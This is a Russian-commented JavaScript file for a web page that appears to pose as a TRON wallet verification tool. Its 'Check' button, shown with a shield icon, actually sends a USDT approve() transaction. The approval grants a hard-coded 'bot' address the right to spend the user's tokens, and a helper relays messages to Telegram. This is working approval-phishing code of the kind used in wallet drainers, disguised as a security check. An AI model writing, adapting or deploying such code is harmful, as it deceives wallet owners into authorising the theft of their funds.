// ============================================
// УПРОЩЁННАЯ ВЕРСИЯ — ТОЛЬКО ДЛЯ ТЕСТА APPROVE
// ============================================

const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

let connectedWalletAddress = null;

// Элементы
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        // TronLink
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            return;
        }
        
        // Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            alert('✅ Trust Wallet подключён!');
            return;
        }
        
        alert('❌ Кошелёк не найден. Установите TronLink или Trust Wallet.');
        
    } catch (error) {
        console.error('Ошибка подключения:', error);
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE — ФИКСИРОВАННЫЕ 10 USDT
// ============================================
async function handleTronCheck() {
    try {
        // Проверяем, подключён ли кошелёк
        if (!connectedWalletAddress) {
            alert('Сначала подключите кошелёк');
            return;
        }

        // Получаем tronWeb
        const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb;
        if (!tronWeb) {
            alert('TronWeb не найден');
            return;
        }

        console.log('🔄 Начинаем approve...');
        
        // ФИКСИРОВАННАЯ СУММА: 10 USDT
        const amount = '10000000'; // 10 USDT
        
        // Получаем контракт
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        console.log('📤 Отправка approve...');
        
        // Блокируем кнопку
        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
        
        // Отправляем approve
        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 150_000_000,
            callValue: 0
        });

        console.log('✅ Approve отправлен:', tx);
        
        // Разблокируем кнопку
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        alert(`✅ Approve успешно отправлен!\n\nTX: https://tronscan.org/#/transaction/${tx}`);
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        
        // Разблокируем кнопку
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        alert(`❌ Ошибка: ${error.message}\n\nСкопируйте этот текст и отправьте мне`);
    }
}

// ============================================
// ТЕСТ TELEGRAM (ОПЦИОНАЛЬНО)
// ============================================
async function testTelegram() {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'test', text: 'Тест из сайта' })
        });
        if (response.ok) alert('✅ Тест успешен!');
        else alert('❌ Ошибка');
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    
    // Делаем testTelegram доступной глобально
    window.testTelegram = testTelegram;
});
